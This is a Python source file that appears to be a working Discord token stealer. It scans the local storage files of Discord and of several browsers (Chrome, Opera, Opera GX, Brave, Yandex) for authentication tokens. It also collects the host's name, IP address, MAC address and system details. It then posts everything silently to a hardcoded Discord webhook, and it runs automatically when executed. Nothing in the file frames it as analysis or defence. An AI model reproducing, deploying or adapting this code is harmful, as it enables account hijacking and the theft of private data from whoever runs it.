import os
import json
import re
from urllib.request import Request, urlopen 
import platform
import socket,re,uuid,logging
from uuid import getnode as get_mac
WEBHOOK = "https://discordapp.com/api/webhooks/814930422794027049/P-Q0kInhc-WQm8h5XjUNm8DUQAjGr5IcDcDIoJdn8LeBzUQODpBi384FhaNuws03Yf-3"
PING_USER = False #Set to True if you want to get mentioned by the bot

# Token Finder
def findTokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.ldb') and not file_name.endswith('.log'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token) 
    return tokens

def systemInformations():
    message = "@everyone" if PING_USER else ""

    message += f'\n**System**\n```\n'
    message += f"{platform.system()}\n```"
    message += f'\n**System Release**\n```\n'
    message += f"{platform.release()}\n```"
    message += f'\n**System version**\n```\n'
    message += f"{platform.version()}\n```"
    message += f'\n**Architecture**\n```\n'
    message += f"{platform.machine()}\n```"
    message += f'\n**Hostname**\n```\n'
    message += f"{platform.node()}\n```"
    message += f'\n**IP adress**\n```\n'
    message += f"{socket.gethostbyname(socket.gethostname())}\n```"
    message += f'\n**MAC adress**\n```\n'
    message += f"{get_mac()}\n```"
    message += f'\n**Processor**\n```\n'
    message += f"{platform.processor()}\n```"

    headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
def main():
    # Token Grabber part
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone" if PING_USER else ""

    #checking from each platform if the path exists, else, the script continues
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**Token {platform}**\n```\n' # adding the founded platform to the message
        tokens = findTokens(path)             # Executing findPath to get its token

        # printing the token or print a no-token message
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n```"
        else:
            message += "No token founded.\n```"
            
        headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

trigger = True
if trigger == True:
    main()
    systemInformations()
